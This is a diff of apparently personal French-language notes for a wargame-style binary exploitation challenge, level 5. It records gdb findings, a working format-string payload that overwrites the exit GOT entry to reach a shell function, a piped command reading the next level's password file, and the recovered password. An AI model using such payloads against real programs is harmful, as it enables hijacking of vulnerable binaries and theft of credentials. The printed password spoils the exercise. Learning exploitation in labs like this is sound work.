@@ -198,9 +198,6 @@ level4:
 
 
 level5:
-
-	documentation:
-		https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Format%20String%20and%20Double-Free%20Attacks.pdf
 	
 	outils:
 		https://hex-works.com/
@@ -209,21 +206,41 @@ level5:
 		Il y a une fonction <o> qui execute "/bin/sh"
 		Probablement modifier la stack de printf pour changer son addresse de retour vu que nous n'avons pas d'insttuction de retour
 		dans les autres fonctions (ca va etre fastidieux)
+		Appel a fonction <exit> et fonction <_exit>
 
 	strategie:
-		Ecrire sur l'adresse de eip mais je crois que la securite de stack m'en empeche
-		Libc exit exploit
+		modifier l'operation de saut de la fonction d'appel cour <exit> pour pointer vers la fonction <o> 		
 
-	addresse <o>:
-		0x80484a4
-		\xa4\x84\x04\x08
+	cmd gdb:
+		p o
+		 `-> $9 = {<text variable, no debug info>} 0x80484a4 <o>
+		info address exit@plt
+		 |-> Symbol "exit@plt" is at 0x80483d0 in a file compiled without debugging.
+		 |
+		 `-> La premiere ligne de la fonction ressemble a ca : (jmp *0x8049838)
 
-	addresse de retour suppose de printf:
-		0x80484f8
-		
 
-	addresse dtor idx:
-		0x8049850
+	solution:
+		Je vais modifier l'addresse a laquelle l'operation jmp va dans la memoire pour pointer vers l'addresse de la fonction <o>
+
+	cmd:
+		(python -c "print('\x38\x98\x04\x08' + 'A'*4 + '\x39\x98\x04\x08' + 'A'*4 + '\x3a\x98\x04\x08' + '%8.x'*3 + 'A'*120 + '%n' + '%992.x' + '%n' + '%896.x' + '%n')"; echo "cat /home/user/level6/.pass") | ./level5
+
+	pass:
+		d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+level6:
+
+	
+
+
+
+
+
+
+
+
 
 
 
